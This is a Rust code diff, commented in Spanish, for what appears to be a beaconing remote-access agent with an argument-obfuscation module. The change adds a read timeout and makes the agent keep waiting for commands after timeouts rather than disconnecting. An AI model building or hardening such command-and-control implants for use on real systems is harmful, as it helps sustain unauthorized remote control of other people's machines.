@@ -24,7 +24,7 @@ mod argfuscator;
 
 #[cfg(target_os = "windows")]
 use std::ffi::CStr;
-use std::io::{BufRead, BufReader, Write};
+use std::io::{BufRead, BufReader, Write, ErrorKind};
 use std::net::TcpStream;
 use std::process::Command;
 use std::thread;
@@ -103,10 +103,13 @@ fn main() {
                     debug_print!("DEBUG: Warning - No se pudo configurar TCP keepalive: {}", e);
                 }
                 
-                // Configurar write timeout para detectar problemas de red al enviar
-                // NO configurar read timeout - el agente debe esperar comandos indefinidamente
-                // El TCP keepalive se encarga de detectar conexiones muertas
+                // Configurar timeouts para evitar cuelgues indefinidos
+                let read_timeout = Duration::from_secs(300); // 5 minutos
                 let write_timeout = Duration::from_secs(30);  // 30 segundos
+                
+                if let Err(e) = stream.set_read_timeout(Some(read_timeout)) {
+                    debug_print!("DEBUG: Warning - No se pudo configurar read timeout: {}", e);
+                }
                 
                 if let Err(e) = stream.set_write_timeout(Some(write_timeout)) {
                     debug_print!("DEBUG: Warning - No se pudo configurar write timeout: {}", e);
@@ -241,7 +244,17 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                 }
                 buffer.clear();
             }
-            Err(_) => break,
+            Err(e) => {
+                // Si es timeout, simplemente continuar esperando comandos
+                // Esto previene reconexiones innecesarias cuando no hay actividad
+                if e.kind() == ErrorKind::TimedOut || e.kind() == ErrorKind::WouldBlock {
+                    debug_print!("DEBUG: Read timeout, continuando...");
+                    continue;
+                }
+                // Para otros errores (conexión cerrada, etc.), salir
+                debug_print!("DEBUG: Error de lectura: {}", e);
+                break;
+            }
         }
     }
 }
